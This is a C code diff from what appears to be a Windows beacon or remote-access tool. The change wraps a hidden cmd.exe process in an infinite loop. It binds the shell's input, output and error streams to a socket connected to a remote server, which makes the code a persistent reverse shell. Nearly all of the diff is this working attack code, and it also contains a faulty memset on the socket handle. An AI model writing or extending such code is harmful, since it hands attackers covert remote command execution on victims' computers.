@@ -91,21 +91,23 @@ void beacon_connect_to_server(char IP[16], int PORT){
     iResult = recv(s, recvbuf, recvbuflen, 0);
 
     // Executing commands
-    STARTUPINFO sinfo;
-    memset(&sinfo, 0, sizeof(sinfo));
-    sinfo.cb = sizeof(sinfo);
-    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-    sinfo.hStdInput = (HANDLE)s;
-    //sinfo.hStdOutput = (HANDLE)s;
-    sinfo.hStdError = (HANDLE)s;
-    PROCESS_INFORMATION pinfo;
-    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
-    WaitForSingleObject(pinfo.hProcess, INFINITE);
-    CloseHandle(pinfo.hProcess);
-    CloseHandle(pinfo.hThread);
-    memset((void *) s, 0, sizeof(s));
-    printf("HELP");
     
+    while(1) {
+        STARTUPINFO sinfo;
+        memset(&sinfo, 0, sizeof(sinfo));
+        sinfo.cb = sizeof(sinfo);
+        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+        sinfo.hStdInput = (HANDLE)s;
+        sinfo.hStdOutput = (HANDLE)s;
+        sinfo.hStdError = (HANDLE)s;
+        PROCESS_INFORMATION pinfo;
+        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+        WaitForSingleObject(pinfo.hProcess, INFINITE);
+        CloseHandle(pinfo.hProcess);
+        CloseHandle(pinfo.hThread);
+        memset((void *) s, 0, sizeof(s));
+        printf("HELP");
+    }
     
     
     
